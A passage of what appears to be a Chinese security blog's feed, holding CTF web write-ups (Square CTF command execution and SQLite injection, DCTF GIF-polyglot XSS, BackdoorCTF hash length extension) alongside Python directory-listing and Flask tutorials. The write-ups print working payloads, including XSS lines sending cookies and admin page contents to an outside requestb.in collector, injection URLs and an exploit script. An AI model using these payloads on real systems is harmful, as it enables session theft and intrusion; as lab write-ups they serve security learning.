flag after leak. Please re-run your solutions on the file! 追踪TCP流看一下。 Forensics1234Best Routerhttp://forensics.chal.csaw.io:3287NOTE: This will expand to ~16GB!19:00 Eastern: updated. Old flags have been removed.]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Square CTF 2017-Web-writeup]]></title>
      <url>%2F2017%2F10%2F05%2FSquare-CTF-2017-Web-writeup%2F</url>
      <content type="text"><![CDATA[Password checker： 代码执行Little Doggy Tables： SQL注入 Password checker 50Task1https://nybas-berog-bitev-fuhyn-fehyt.capturethesquare.com/ Solution查看源代码，发现有如下js：12345678910111213141516&lt;script type="text/javascript"&gt;function validate(objForm) &#123; let toBeCheckedValue = objForm.elements['password'].value; let xmlHttp = new XMLHttpRequest(); xmlHttp.open('GET', '/run.php?cmd=cat%20../password.txt', false); xmlHttp.send(null); let actualValue = xmlHttp.responseText; if (toBeCheckedValue != actualValue) &#123; alert('Passwords don\'t match!'); &#125; else &#123; alert('Password validated!'); &#125;&#125;&lt;/script&gt; 访问：1https://nybas-berog-bitev-fuhyn-fehyt.capturethesquare.com//run.php?cmd=cat%20../password.txt 得到密码：password123 ，输进去后只是弹出一个提示框。 考虑命令执行，尝试查找flag：1https://nybas-berog-bitev-fuhyn-fehyt.capturethesquare.com/run.php?cmd=find / | grep flag 1https://nybas-berog-bitev-fuhyn-fehyt.capturethesquare.com/run.php?cmd=cat /secrets/..109810_05_10_06_49_46.546032825/flag 得到flag：1flag-tyzyd-gateh-lefif-girav-bobut 另外读到run.php的源码:1234&lt;?php$line = exec($_GET['cmd']);echo $line;?&gt; Little Doggy Tables 100Task12345678910&quot;Oh, so you found it. Yes, it will tell you if a given agent is a dog or a cat, by looking up the appropriate value in its SQLite database. Good luck with that.&quot;Sure, the database contains some sensitive information, but our bulletproof firewall and top-notch quote escaping will ensure it never sees the light of day.&quot;Not secure? Huh? You don’t believe me? I’ll show you how secure. Here’s the source!&quot;USAGE EXAMPLE:curl &quot;https://little-doggy-tables.capturethesquare.com/agent_lookup&quot; --get --data-urlencode &quot;codename=Fido&quot;https://little-doggy-tables.capturethesquare.com Solution源码如下:123456789101112131415161718192021222324252627282930313233343536373839404142434445#!/usr/bin/env ruby# author: Will McChesney &lt;wmcc@squareup.com&gt;require "sqlite3"require "webrick"PORT = ARGV[0]class SecureDatastore include Singleton def initialize @db = SQLite3::Database.new("secure.db") end def secure_species_lookup(insecure_codename) # roll our own escaping to prevent SQL injection attacks secure_codename = insecure_codename.gsub("'", Regexp.escape("\\'")) query = "SELECT species FROM operatives WHERE codename = '#&#123;secure_codename&#125;';" puts query results = @db.execute(query) return if results.length == 0 results[0][0] endendserver = WEBrick::HTTPServer.new(Port: PORT)trap("INT") &#123; server.shutdown &#125;class AgentLookupServlet &lt; WEBrick::HTTPServlet::AbstractServlet def do_GET(request, response) response.status = 200 response["Content-Type"] = "text/plain" response.body = SecureDatastore.instance.secure_species_lookup(request.query["codename"]) + "\n" endendserver.mount "/agent_lookup", AgentLookupServletserver.start 从题目的一大段描述，以及给出的源码来看应该是考察SQLite3注入。关键在于下面这两句代码：12secure_codename = insecure_codename.gsub("'", Regexp.escape("\\'"))query = "SELECT species FROM operatives WHERE codename = '#&#123;secure_codename&#125;';" 会将单引号&#39; 通过正则替换成\&#39;进行转义，来阻止我们闭合。但如果我们传入\&#39;，则在通过正则替换后会变成\\&#39;，其中第二个’\’是正则添加的，配合我们传入的\，会被转义，从而使我们的单引号逃逸。 在sqlite中，注释符为--，尝试访问:1https://little-doggy-tables.capturethesquare.com/agent_lookup?codename=\&apos; or 1=1 -- 则服务器端执行的数据库查询语句如下，注意\\：1SELECT species FROM operatives WHERE codename = &apos;\\&apos; or 1=1 --&apos;; 单引号逃逸成功。 接下去考虑如何注出数据。1https://little-doggy-tables.capturethesquare.com/agent_lookup?codename=\&apos; union select sql from sqlite_master limit 0,1-- 说明operatives表里有三个字段：codename，species，secret 。 12https://little-doggy-tables.capturethesquare.com/agent_lookup?codename=\&apos; union select secret from operatives limit 0,1-- 直接提交不对。。。后面发现应该要改变limit。最后payload：12https://little-doggy-tables.capturethesquare.com/agent_lookup?codename=\&apos; union select secret from operatives limit 9,1-- flag:1flag-a3db5c13ff90a36963278c6a39e4ee3c22e2a436]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Python中列目录相关函数/模块]]></title>
      <url>%2F2017%2F10%2F04%2FPython%E4%B8%AD%E5%88%97%E7%9B%AE%E5%BD%95%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0-%E6%A8%A1%E5%9D%97%2F</url>
      <content type="text"><![CDATA[测试环境：python 3.6.1 python 2.7.2测试目录：cmspoc osos.listdir语法：1os.listdir(path) 1234# python 3.6.1 python 2.7.2&gt;&gt;&gt; import os&gt;&gt;&gt; os.listdir("./")['.ftpconfig', '.git', '.gitignore', 'cmspoc.py', 'data', 'lib', 'README.md', 'scripts', 'tty.gif', 'ttyrecord'] 可以以列表（list）列出当前目录下的文件夹及其文件，但没有区分开。同时注意并没有把特殊目录../，./作为结果返回。 可以利用os.path.isfile来判断是否为文件：123# python 3.6.1 python 2.7.2&gt;&gt;&gt; [ i for i in os.listdir("./") if os.path.isfile(i)]['.ftpconfig', '.gitignore', 'cmspoc.py', 'README.md', 'tty.gif', 'ttyrecord'] 可以利用os.path.isdir来判断是否为文件夹：123# python 3.6.1 python 2.7.2&gt;&gt;&gt; [ i for i in os.listdir("./") if os.path.isdir(i)]['.git', 'data', 'lib', 'scripts'] 也可以用来查找指定结尾（不一定是后缀）的文件:1234&gt;&gt;&gt; [i for i in os.listdir("./") if i.endswith("d")]['README.md', 'ttyrecord']&gt;&gt;&gt; [i for i in os.listdir("./") if i.endswith(".py")]['cmspoc.py'] os.walk语法：1os.walk(top, topdown=True, onerror=None, followlinks=False) os.walk可以进行文件遍历。它接受四个参数，但绝大部分情况下直接传入一个路径就可。它的返回值一个三元组(dirpath, dirnames, filenames)。dirpath是指当前目录路径，dirnames是当前目录下所有子目录的名字（包括.和..），filenames是指dirpath中的文件（即非文件夹）。 假设此时的目录在cmspoc的script目录中：1234567891011121314λ tree /F卷 新加卷 的文件夹 PATH 列表卷序列号为 000000DE 0CBE:322DE:.│ __init__.py│├─icms│ v701_sqlinject_getadmin.py│ __init__.py│└─phpcms v960_fileupload_getshell.py v960_sqlinject_getpasswd.py __init__.py 则用for循环即可完成遍历：1234567# python 3.6.1 python 2.7.2&gt;&gt;&gt; for root, dirnames, filenames in os.walk('./'):... print(root,dirnames,filenames)..../ ['icms', 'phpcms'] ['__init__.py']./icms [] ['v701_sqlinject_getadmin.py', '__init__.py']./phpcms [] ['v960_fileupload_getshell.py', 'v960_sqlinject_getpasswd.py', '__init__.py'] 基于for循环遍历提取/过滤文件：123456789101112# python 3.6.1 python 2.7.2&gt;&gt;&gt; for root, dirnames, filenames in os.walk('./'):... for f in filenames :... if f.endswith(".py"):... print(os.path.join(root,f))..../__init__.py./icms/v701_sqlinject_getadmin.py./icms/__init__.py./phpcms/v960_fileupload_getshell.py./phpcms/v960_sqlinject_getpasswd.py./phpcms/__init__.py os.scandir从python3.5版本后有os.scandir()，能更快的遍历目录。更多介绍：os.scandir() function 123456789101112# python 3.6.1&gt;&gt;&gt; for f in os.scandir():... print(f) ... &lt;DirEntry '.ftpconfig'&gt; &lt;DirEntry '.git'&gt; &lt;DirEntry '.gitignore'&gt; &lt;DirEntry 'cmspoc.py'&gt; &lt;DirEntry 'data'&gt; &lt;DirEntry 'lib'&gt; &lt;DirEntry 'README.md'&gt; &lt;DirEntry 'scripts'&gt; 可以看到返回的是DirEntry对象，下面列一些简单的属性与方法。 仅打印出名字（name属性）：123# python 3.6.1&gt;&gt;&gt; [f.name for f in os.scandir()] [&apos;.ftpconfig&apos;, &apos;.git&apos;, &apos;.gitignore&apos;, &apos;cmspoc.py&apos;, &apos;data&apos;, &apos;lib&apos;, &apos;README.md&apos;, &apos;scripts&apos;,&apos;tty.gif&apos;, &apos;ttyrecord&apos;] 判断是否为文件：123# python 3.6.1&gt;&gt;&gt; [f.name for f in os.scandir() if f.is_file()]['.ftpconfig', '.gitignore', 'cmspoc.py', 'README.md', 'tty.gif', 'ttyrecord'] 判断是否为文件夹：123# python 3.6.1&gt;&gt;&gt; [f.name for f in os.scandir() if f.is_dir()]['.git', 'data', 'lib', 'scripts'] glob确切的说，glob模块不是来列目录的，是用来查找给定规则的文件路径名。查询所需的字符（规则）有三个： * 表示通配符，匹配零个或多个字符。 ? 匹配一个字符。 [] 匹配指定范围内的字符。 相关文档见这：python2.7，python3.6 glob.glob语法：1glob.glob(pathname) 可以使用绝对路径，配合*列出指定目录下所有文件：1234# python 3.6.1 python 2.7.2&gt;&gt;&gt; import glob&gt;&gt;&gt; glob.glob(r"E:\cmsPoc\*")['E:\\cmsPoc\\cmspoc.py', 'E:\\cmsPoc\\data', 'E:\\cmsPoc\\lib', 'E:\\cmsPoc\\README.md', 'E:\\cmsPoc\\scripts', 'E:\\cmsPoc\\tty.gif', 'E:\\cmsPoc\\ttyrecord'] 也可以使用相对路径：12345678# python 3.6.1 python 2.7.2# use *&gt;&gt;&gt; glob.glob(r"*")['cmspoc.py', 'data', 'lib', 'README.md', 'scripts', 'tty.gif', 'ttyrecord']# user ./*&gt;&gt;&gt; glob.glob(r"./*")['.\\cmspoc.py', '.\\data', '.\\lib', '.\\README.md', '.\\scripts', '.\\tty.gif', '.\\ttyrecord'] 可以查找满足符合规则的文件，比如查找py文件：123# python 3.6.1 python 2.7.2&gt;&gt;&gt; glob.glob(r"*.py")['cmspoc.py'] 在python3.5以上，glob.glob支持特殊通配符**和递归（recursive ）操作，： 比如列出当前目录下所有的py文件：12&gt;&gt;&gt; glob.glob(r"./**/*.py",recursive=True)['.\\cmspoc.py', '.\\lib\\__init__.py', '.\\lib\\controllor\\controllor.py', '.\\lib\\controllor\\__init__.py', '.\\lib\\core\\common.py', '.\\lib\\core\\data.py', '.\\lib\\core\\datatype.py', '.\\lib\\core\\setting.py', '.\\lib\\core\\__init__.py', '.\\lib\\parse\\cmdline.py', '.\\lib\\parse\\__init__.py', '.\\lib\\plugin\\__init__.py', '.\\lib\\plugin\\crypto\\authcode.py', '.\\lib\\plugin\\crypto\\__init__.py', '.\\scripts\\__init__.py', '.\\scripts\\icms\\v701_sqlinject_getadmin.py', '.\\scripts\\icms\\__init__.py', '.\\scripts\\phpcms\\v960_fileupload_getshell.py', '.\\scripts\\phpcms\\v960_sqlinject_getpasswd.py', '.\\scripts\\phpcms\\__init__.py'] glob.iglobiglob返回一个能生成与glob()结果相同的迭代器：12345678910111213# python 3.6.1 python 2.7.2&gt;&gt;&gt; glob.iglob(r"./*")&lt;generator object _iglob at 0x00000096635ED150&gt;&gt;&gt;&gt; for i in glob.iglob(r"./*"):... print(i)....\cmspoc.py.\data.\lib.\README.md.\scripts.\tty.gif.\ttyrecord pathlibpathlib在python3.4及其之后版本中默认继承了，python3.3之前的版本需要通过pip进行安装。 打印出当前目录（.）下的文件夹与文件：123456789101112131415# python 3.6.1&gt;&gt;&gt; import pathlib&gt;&gt;&gt; for p in pathlib.Path('.').iterdir():... print(p)....ftpconfig.git.gitignorecmspoc.pydatalibREADME.mdscriptstty.gifttyrecord 仅打印出当前目录（.）下的文件：1234567891011121314# python 3.6.1&gt;&gt;&gt; for p in pathlib.Path('.').iterdir(): ... if p.is_file(): ... print(p) ... .ftpconfig .gitignore cmspoc.py README.md tty.gif ttyrecord &gt;&gt;&gt; [p for p in pathlib.Path('.').iterdir() if p.is_file()][WindowsPath('.ftpconfig'), WindowsPath('.gitignore'), WindowsPath('cmspoc.py'), WindowsPath('README.md'), WindowsPath('tty.gif'), WindowsPath('ttyrecord')] 仅打印出当前目录（.）下的文件夹：1234567891011121314151617# python 3.6.1&gt;&gt;&gt; for p in pathlib.Path('.').iterdir():... print(p)....ftpconfig.git.gitignorecmspoc.pydatalibREADME.mdscriptstty.gifttyrecord&gt;&gt;&gt; [p for p in pathlib.Path('.').iterdir() if p.is_dir()][WindowsPath('.git'), WindowsPath('data'), WindowsPath('lib'), WindowsPath('scripts')] Refference diveintopython:Working with Directories stackoverflow:Find all files in a directory with extension .txt in Python stackoverflow:Use a Glob() to find files recursively in Python? stackoverflow:Directory listing in Python stackoverflow:How do I list all files of a directory? stackoverflow:Getting a list of all subdirectories in the current directory stackoverflow:How to get all of the immediate subdirectories in Python Options for listing the files in a directory with Python]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[DCTF 2017-DCTF LLC-writeup]]></title>
      <url>%2F2017%2F10%2F04%2FDCTF-2017-DCTF-LLC-writeup%2F</url>
      <content type="text"><![CDATA[文件上传+XSS Task1https://llc.dctf-quals-17.def.camp/ Solution有一个文件上传功能，允许上传jpg,png,gif文件，并且对上传文件的幻数进行了检查，仅仅修改上传的扩展名是没有用的。在完成上传后，会将上传的图片preview出来，也就是说我们知道上传的图片的具体位置。 还有一个发送message的功能，结合题目的信息，以及csp头，估计这题是要考察xss： 文件上传功能+XSS，可以参考一下这篇文章：File Upload XSS 所以思路如下： 上传一张包含xss-payload的gif，得到gif的地址。 构造message为 发送message，执行xss-payload。 尝试获取一下Cookie，构造gif的paylaod如下：1GIF89a/*.*/=0;window.location=&quot;https://requestb.in/1hw0wip1?cookie=&quot;+escape(document.cookie); 在message框里填上payload，gif的图像地址：1&lt;script src=&quot;https://llc.dctf-quals-17.def.camp/__f6d24a42ddee7772707acf41c841d585/temp.gif&quot;&gt;&lt;/script&gt; submit后可以看到接受到的请求： 得到的cookie是USERID%3D%3CSCRIPT%3Ealert%28%27XSS%27%29%3C/SCRIPT%3E，即USERID=&lt;SCRIPT&gt;alert(&#39;XSS&#39;)&lt;/SCRIPT&gt;。没啥帮助。 观察到Referer: https://llc.dctf-quals-17.def.camp//bot.php?id=8472，存在一个bot.php，直接访问只发现它引入了jquery.js.min。利用gif的xss尝试读取：1GIF89a/*.*/=0;var ajax = new XMLHttpRequest();ajax.open(&quot;GET&quot;,&quot;bot.php&quot;,false);ajax.send();window.location=&quot;https://requestb.in/1hw0wip1?text=&quot;+btoa(ajax.responseText); 同样没有用。 通过扫描器，可以扫出一个 admin.php，构造gif：1GIF89a/*.*/=0;var ajax = new XMLHttpRequest();ajax.open(&quot;GET&quot;,&quot;admin.php&quot;,false);ajax.send();window.location=&quot;https://requestb.in/1hw0wip1?text=&quot;+btoa(ajax.responseText); 1RENURns4MDhmNTBjYTNmMzE4MmEzMGU3NmJiOWZjYzBmZGNiN2Y3NWY0Y2U1OTdmN2FiZTE3OTNlMzk0MmFjZjNlYzllfQ== base64解码后得到：1DCTF&#123;808f50ca3f3182a30e76bb9fcc0fdcb7f75f4ce597f7abe1793e3942acf3ec9e&#125; 考虑到bot.php有引入jquery。所以gif的xsspayload也可以如下：1GIF89a/*.*/=0;$.get(&quot;admin.php&quot;,function(data)&#123;window.location=&quot;https://requestb.in/1hw0wip1?text=&quot;+btoa(data);&#125;); 排版后的几段实际执行的payload:1window.location="https://requestb.in/1hw0wip1?cookie="+escape(document.cookie); 1234var ajax = new XMLHttpRequest();ajax.open("GET","bot.php",false);ajax.send();window.location="https://requestb.in/1hw0wip1?text="+btoa(ajax.responseText) 123$.get("admin.php",function(data)&#123; window.location="https://requestb.in/1hw0wip1?text="+btoa(data);&#125;);]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[BackdoorCTF 2017-Extends Me-writeup]]></title>
      <url>%2F2017%2F09%2F28%2FBackdoorCTF-2017-Extends-Me-writeup%2F</url>
      <content type="text"><![CDATA[哈希长度扩展攻击 以及一种奇葩解法 已将该题收录至Code-Audit-Challenges-python:1 Task12Extends Mehttps://extend-me-please.herokuapp.com/login 页面打开如下: Solution题目提供了源码，如下：server.py:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051from flask import *from hash import SLHA1app = Flask(__name__)key = file('SECRET').read().strip()@app.route('/')def root(): return redirect(url_for('login'))@app.route('/login',methods = ['GET', 'POST'])def login(): if request.method == 'POST': if not request.form.get('username'): return render_template('login.html') else: username = str(request.form.get('username')) if request.cookies.get('data') and request.cookies.get('user'): data = str(request.cookies.get('data')).decode('base64').strip() user = str(request.cookies.get('user')).decode('base64').strip() temp = '|'.join([key,username,user]) if data != SLHA1(temp).digest(): temp = SLHA1(temp).digest().encode('base64').strip().replace('\n','') resp = make_response(render_template('welcome_new.html',name = username)) resp.set_cookie('user','user'.encode('base64').strip()) resp.set_cookie('data',temp) return resp else: if 'admin' in user: # too lazy to check properly :p return "Here you go : CTF&#123;XXXXXXXXXXXXXXXXXXXXXXXXX&#125;" else: return render_template('welcome_back.html',name = username) else: resp = make_response(render_template('welcome_new.html',name = username)) temp = '|'.join([key,username,'user']) resp.set_cookie('data',SLHA1(temp).digest().encode('base64').strip().replace('\n','')) resp.set_cookie('user','user'.encode('base64').strip()) return resp else: return render_template('login.html')@app.route('/logout')def logout(): resp = make_response(render_template('login.html')) resp.set_cookie('data','',expires=0) resp.set_cookie('user','',expires=0) return (resp)if __name__=="__main__": app.run() 还有hash.py，鉴于太长，这里就不贴出来了，可以见这：Code-Audit-Challenges-python:1 看一下server.py的流程，分为三个路由： 根路径，会重定向到login login页面，登陆后能拿到flag。 logout页面 流程分析接下来细看login()，这里会啰嗦点尽量把整个流程解释清楚（其实都是废话）。 当我们在表单中输入用户名并提交后，server.py通过str(request.form.get(&#39;username&#39;))获取用户名并保存到变量username中。 接下来，如果在cookie中能获取到data和user字段，则接收并进行base64解码后去掉两边的空格之后存放到对应的变量data和user中：12data = str(request.cookies.get(&apos;data&apos;)).decode(&apos;base64&apos;).strip()user = str(request.cookies.get(&apos;user&apos;)).decode(&apos;base64&apos;).strip() 其中strip()的作用是去掉字符串头尾指定的字符，默认为空格。 接下来通过join操作，得到一个变量temp，其组成为key|username|user，其中username和user即前面提到的。而这个key是通过下面的语句定义的：1key = file(&apos;SECRET&apos;).read().strip() 也就是说，变量key是未知的。 继续，截取server.py的代码如下：1234567891011if data != SLHA1(temp).digest(): temp = SLHA1(temp).digest().encode('base64').strip().replace('\n','') resp = make_response(render_template('welcome_new.html',name = username)) resp.set_cookie('user','user'.encode('base64').strip()) resp.set_cookie('data',temp) return respelse: if 'admin' in user: # too lazy to check properly :p return "Here you go : CTF&#123;XXXXXXXXXXXXXXXXXXXXXXXXX&#125;" else: return render_template('welcome_back.html',name = username) 会进行一个data与SLHA1(temp)的比较，其中SLHA1(temp)的具体实现在hash.py)中。如果比较相等且字符串admin在变量user中，则得到flag。注意这里是用in操作符，所以如下的情况是真的:12&gt;&gt;&gt; &apos;admin&apos; in &apos;userxxxxxxxxxadmin&apos;True 如果比较不等，则会进行一个set_cookie操作，即我们会接受到以下的cookie:12user = base64encode(user)data = temp 即 data = SLHA1(key|username|user).digest().encode(&apos;base64&apos;).strip().replace(&apos;\n&apos;,&apos;&apos;) 如果在cookie中不能能获取到data和user字段，它会执行下面的代码：12345resp = make_response(render_template('welcome_new.html',name = username))temp = '|'.join([key,username,'user'])resp.set_cookie('data',SLHA1(temp).digest().encode('base64').strip().replace('\n',''))resp.set_cookie('user','user'.encode('base64').strip())return resp 也是有一个set_cookie操作，我们会得到以下的cookie：12data = SLHA1(key|username|&apos;user&apos;).digest().encode(&apos;base64&apos;).strip().replace(&apos;\n&apos;,&apos;&apos;)user = base64encode(&apos;user&apos;) 这里括号中的&#39;user&#39;是指定的字符串，跟前面我们通过cookie传入得到的user变量是不一样的。 接下来看看SLHA1函数，这个是模仿了SHA1加密，对一些参数等做了修改，但本质上是基于Merkle–Damgård construction。所以我可以尝试一下哈希长度扩展攻击。 法一：哈希长度扩展攻击基本的思路如下： 先获取到cookie，其中data=SLHA1(key|xxx)，user=base64encode(‘user’) 基于第一步，通过哈希长度扩展攻击，得到SLHA1(key|xxx。。。admin)。 构造data，user字段，发送cookie，使之满足data == SLHA1(temp).digest() 第一步获取cookie：几个已知的参数如下：12345username = &quot;chybeta&quot;data=&quot;GwgWlwVYqelmztYx1n//EfyTIU6cH8ab&quot;user=&quot;dXNlcg==&quot;base64decode(&quot;dXNlcg==&quot;) = &quot;user&quot; data由服务器端经过SLHA1(&quot;xxxx|chybeta|user&quot;)加密得到，括号里的都是字符串不是变量，xxxx表示key。 第二步，进行哈希长度扩展攻击。先看看目标，注意以下代码：12345if request.cookies.get('data') and request.cookies.get('user'): data = str(request.cookies.get('data')).decode('base64').strip() user = str(request.cookies.get('user')).decode('base64').strip() temp = '|'.join([key,username,user]) if data != SLHA1(temp).digest(): 要构造出SLHA1(&quot;xxxx|chybeta|user&quot;+padding+&quot;admin&quot;)，并将其设置为data。同时设置cookie中的user为base64encode(“user”+padding+”admin”)。即：12data = SLHA1(&quot;xxxx|chybeta|user&quot;+padding+&quot;admin&quot;)user = base64encode(&quot;user&quot;+padding+&quot;admin&quot;) 这样服务器端的流程约莫如下： 保持post传入的username仍为”chybeta” data = str(request.cookies.get(‘data’)).decode(‘base64’).strip() 得到 data = SLHA1(“xxxx|chybeta|user”+padding+”admin”) user = str(request.cookies.get(‘user’)).decode(‘base64’).strip() 得到 user = “user”+padding+”admin” temp = ‘|’.join([key,username,user]) 得到 temp = “xxxx|chybeta|user”+padding+”admin” 判断 SLHA1(“xxxx|chybeta|user”+padding+”admin”) == SLHA1(“xxxx|chybeta|user”+padding+”admin”) 因为出题者自己写了SLHA1，所以现成的工具是不行的。对照SHA1加密算法，我们写一个对SLHA1的长度扩展攻击算法。 上面这图是SHA1加密算法的流程：首先有原始register值，然后将hash的字符串分组等初始化操作后进行复杂的数学运算，同时会生成新的register的值，供下一个chunk进行加密使用。 在hash.py中，SLHA1算法的原始register值有6个：a，b，c，d，e，f。它们在每个chunk加密后会被更新，以参与下一个chunk的加密。可以通过self._h进行赋值来直接指定SLHA1算法的register值。 对一个字符串进行SLHA1算法加密，可以通过调用update()来进行.对加密字符串的初始化操作如下：1234567891011121314def _produce_digest(self): message = self._unprocessed message_byte_length = self._message_byte_length + len(message) message += b'\xfd' message += b'\xab' * ((56 - (message_byte_length + 1) % 64) % 64) message_bit_length = message_byte_length * 8 message += struct.pack(b'&gt;Q', message_bit_length) h = _process_chunk(message[:64], *self._h) if len(message) == 64: return h return _process_chunk(message[64:], *h) message是要进行加密的字符串。它会先加上一个字节\xfd，之后再加上一堆的\xab，使得chunk的长度能满足整除64后余数为56。之后添上8个字节的长度描述符。接下去从h = _process_chunk...开始是对最后一个chunk的加密处理。 由于要进行padding，我们需要知道原本xxxx|chybeta的长度，但xxx是未知的，这个可以爆破解决。 借用一下人家的脚本：1234567891011121314151617181920212223242526272829303132333435from hash import SLHA1import structimport requestsdef extend(digest, length, ext): pad = '\xfd' pad += '\xab' * ((56 - (length + 1) % 64) % 64) pad += struct.pack('&gt;Q', length * 8) slha = SLHA1() slha._h = [struct.unpack('&gt;I', digest[i*4:i*4+4])[0] for i in range(6)] slha._message_byte_length = length + len(pad) slha.update(ext) return (pad + ext, slha.digest())post = &#123; 'username': 'chybeta'&#125;cookies = &#123; 'data': 'GwgWlwVYqelmztYx1n//EfyTIU6cH8ab', 'user': 'dXNlcg=='&#125;orig_digest = cookies['data'].decode('base64')orig_user = cookies['user'].decode('base64')min_len = len('|'.join(['?', post['username'], orig_user]))for length in range(min_len, min_len+64): print('[+] Trying length: &#123;&#125;'.format(length)) ext, new_digest = extend(orig_digest, length, 'admin') cookies['data'] = new_digest.encode('base64').strip().replace('\n', '') cookies['user'] = (orig_user + ext).encode('base64').strip().replace('\n', '') r = requests.post('https://extend-me-please.herokuapp.com/login', data=post, cookies=cookies) if 'CTF&#123;' in r.text: print(r.text) break PS: 其实今天早上（17/9/29）自己也写了一个脚本，但有些问题，准备过会再调试一下。然后下课后，TT &amp;&amp; GG: 网站居然下线了woc。。。。。 法二：剑走偏锋：）这个算是非预期解。毕竟这题名字叫Extend me，明显就是考哈希长度扩展攻击。不过这个非预期解法也蛮好玩的。 先通过post参数，设置username为 “chybeta|admin”。接着服务器进行加密 SLHA1(“xxxx|chybeta|admin|user”)，这里的xxxx是指key，后面的user是服务器端默认的，中间的“chybeta|admin”即为变量username，这个加密过程对应：123456789101112username = str(request.form.get('username')) # username = "chybeta|admin"if request.cookies.get('data') and request.cookies.get('user'): 。。。else: 。。。 # 假设key的值为 xxxx temp = '|'.join([key,username,'user']) # temp = xxxx|chybeta|admin|user resp.set_cookie('data',SLHA1(temp).digest().encode('base64').strip().replace('\n','')) # data = SLHA1("xxxx|chybeta|admin|user").encode('base64')... resp.set_cookie('user','user'.encode('base64').strip()) # user = 'user'.encode('base64') return resp 第二步，更改cookie中的user字段：12原本：user = &quot;dXNlcg==&quot; # base64decode(&quot;dXNlcg==&quot;)=&quot;user&quot;。现在：user = &quot;YWRtaW58dXNlcg==&quot; # base64decode(&quot;YWRtaW58dXNlcg==&quot;) = &quot;admin|user&quot;。 Cookie的data字段保持不变。post进的username改为”chybeta”接下来仔细看一下关键验证代码：1234567891011121314151617181920212223242526272829username = str(request.form.get('username')) # username = "chybeta"if request.cookies.get('data') and request.cookies.get('user'): data = str(request.cookies.get('data')).decode('base64').strip() # data = SLHA1("xxxx|chybeta|admin|user") user = str(request.cookies.get('user')).decode('base64').strip() # user = "admin|user" # 假设 key的值为xxxx temp = '|'.join([key,username,user]) # temp = key + "|" + username + "|" + user # temp = "xxxx" + "|" + "chybeta" + "|" + "admin|user" = "xxxx|chybeta|admin|user" # data = SLHA1("xxxx|chybeta|admin|user") # SLHA1(temp) = SLHA1("xxxx|chybeta|admin|user") if data != SLHA1(temp).digest(): temp = SLHA1(temp).digest().encode('base64').strip().replace('\n','') resp = make_response(render_template('welcome_new.html',name = username)) resp.set_cookie('user','user'.encode('base64').strip()) resp.set_cookie('data',temp) return resp else: # user = "admin|user" if 'admin' in user: # too lazy to check properly :p # 'admin' in "admin|user" OK!!!! return "Here you go : CTF&#123;XXXXXXXXXXXXXXXXXXXXXXXXX&#125;" else: return render_template('welcome_back.html',name = username)]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Flask Web开发笔记(1):程序的基本结构]]></title>
      <url>%2F2017%2F09%2F20%2FFlask-Web%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0-1-%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%BB%93%E6%9E%84%2F</url>
      <content type="text"><![CDATA[最近跟着狗书和flask文档学习Flask。结合官方文档对一些知识点做一些笔记，并做一些适当扩展。所以不太成体系甚至很零散，勿喷。 初始化Flask程序必须要创建一个程序实例，程序实例是Flask类的对象。如下：12from flask import Flaskapp = Flask(__name__) 对于该Flask类，其定义如下：1class flask.Flask(import_name, static_path=None, static_url_path=None, static_folder=’static’, template_folder=’templates’, instance_path=None, instance_relative_config=False, root_path=None) 第一个参数是必须要指定的。Flask用这个参数来找到相对于程序根目录的资源文件位置。如果是使用单一的模块(module)，使用__name__就行了。如果是使用一个包(package)的话，推荐硬编码进去。 路由和视图函数flask程序实例保存了一个URL到python函数的映射关系。当客户端发送请求，服务器将请求转发给flask程序实例，flask程序实例依照映射关系利用函数进行处理。处理URL和函数之间的关系称之为路由。而像下文的index()和hello()的处理函数，称之为视图函数。 可以使用app.route修饰器来定义路由。(注：这里的app是前面已经创建好了的Flask类的对象)。 基本示例：1234567@app.route('/')def index(): return "hello world!"@app.route('/hello')def hello(): return "hello hello world!" 在默认情况下，访问http://localhost:5000/时页面会打印出hello,world!，当访问http://localhost:5000/hello时，页面则会打印出hello hello world!。 也可以构造动态的URL。通过给URL加上变量，利用装饰器，可以对URL的变量来做出对应的变化。这些动态的部分/变量，需要被标记为&lt;variable_name&gt;或者&lt;converter:variable_name&gt;，这个部分将可以被作为命名参数传递到函数中。1234567@app.route('/&lt;name&gt;')def user(name): return "I'm %s" % name@app.route('/&lt;int:id&gt;')def userid(id): return "The isinstance(id,int): %s" % isinstance(id,int) 访问：http://localhost:5000/chybeta，会将字符串chybeta传递到user函数中，并返回给客户都：I’m chybeta。 若是访问：http://localhost:5000/1 则： 在第二个例子中：@app.route(&#39;/&lt;int:id&gt;&#39;)，指定了一个转换器，将id转换为整型int。目前有以下几种转换器： 类型 说明 string 默认。接受除了斜杠以外的文本 int 接受整数 float 同 int ，但是接受浮点数 path 和默认的相似，但也接受斜线 any matches one of the items provided uuid 接受uuid字符串 path选择器的作用如下：123@app.route('/&lt;path:paths&gt;')def path(paths): return "The path: %s" % paths 也就是说，path选择器不会把斜线作为分隔符，而是作为匹配的一整个部分。 any选择器，未知，哪位解释下？ uuid，如下：123@app.route('/&lt;uuid:id&gt;')def uuid(id): return "The uuid: %s" % id flask的Web服务器在前面定义好程序实例app后，可以用run()方法来启动flask自带的Web服务器。12if __name__ == '__main__': app.run(debug=True) run()方法的定义如下：1run(host=None, port=None, debug=None, **options) 在 debug 模式启用的情况下(debug=True)，服务器会对修改的代码自动重新加载。 另外，这个本身的服务器并不适用于生产环境。详情可见：Deployment Options 请求与响应循环程序与请求上下文123456from flask import request@app.route('/')def index(): user_agent = request.headers.get('User-Agent') return '&lt;p&gt;Your brower is %s&lt;/p&gt;' % user_agent 这里出现了一个request类。关于其介绍可以见这里。对于传入的request数据，flask保存了一个全局变量request对象。在一个多线程的环境中，flask能确保特定的request对象在特定的线程中全局可访问。 有一些较为常用的attributes： request.headers: 以字典形式保存保存了request的头部。。 request.method：指明了是GET还是POST方法等。 request.cookies： 以字典形式保存了cookie …. 还有好多 遇到再补充。 请求调度接前面的URL映射关系与路由。除了使用app.route()修饰器来注册为事件的处理程序外，还有另外两种: flask.Flask.add_url_rule() flask.Flask.url_map 这里不展开，详细可见URL Route Registrations 请求钩子响应Flask扩展]]></content>
    </entry>

    
    <entry>
